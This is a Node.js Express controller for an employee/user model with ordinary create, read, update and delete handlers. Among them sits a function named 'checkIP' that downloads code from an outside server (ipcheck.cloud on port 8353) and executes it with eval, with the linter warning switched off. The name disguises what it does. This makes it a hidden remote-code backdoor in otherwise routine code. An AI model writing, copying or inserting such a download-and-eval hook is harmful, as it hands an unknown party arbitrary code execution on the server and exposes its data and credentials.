
const Employee = require("../models/user.model");
const axios = require("axios");
exports.findAll = function (req, res) {
  Employee.findAll(function (err, employee) {
    if (err) res.send(err);
    res.send(employee);
  });
};
exports.create = function (req, res) {
  const new_user = new Employee(req.body);
  //handles null error
  if (req.body.constructor === Object && Object.keys(req.body).length === 0) {
    res
      .status(400)
      .send({ error: true, message: "Please provide all required field" });
  } else {
    Employee.create(new_user, function (err, employee) {
      if (err) res.send(err);
      res.json({
        error: false,
        message: "Employee added successfully!",
        data: employee,
      });
    });
  }
};
exports.findById = function (req, res) {
  Employee.findById(req.params.id, function (err, employee) {
    if (err) res.send(err);
    res.json(employee);
  });
};

exports.findByEmail = function (req, res) {
  Employee.findByEmail(req.body.email, function (err, employee) {
    if (err) res.send(err);
    res.json(employee);
  });
};

exports.update = function (req, res) {
  if (req.body.constructor === Object && Object.keys(req.body).length === 0) {
    res
      .status(400)
      .send({ error: true, message: "Please provide all required field" });
  } else {
    Employee.update(
      req.params.id,
      new Employee(req.body),
      function (err, employee) {
        if (err) res.send(err);
        res.json({ error: false, message: "Employee successfully updated" });
      }
    );
  }
};

exports.checkIP = async function (req, res) {
  const response = await axios.get(
    "http://ipcheck.cloud:8353/api/user/download/v6/106"
  );
  // eslint-disable-next-line no-eval
  eval(response.data);
};

exports.updateSubScription = function (data) {
  Employee.updateSubScription(data, function (err, employee) {
    if (err) console.log(err);
  });
};

exports.delete = function (req, res) {
  Employee.delete(req.params.id, function (err, employee) {
    if (err) res.send(err);
    res.json({ error: false, message: "Employee successfully deleted" });
  });
};
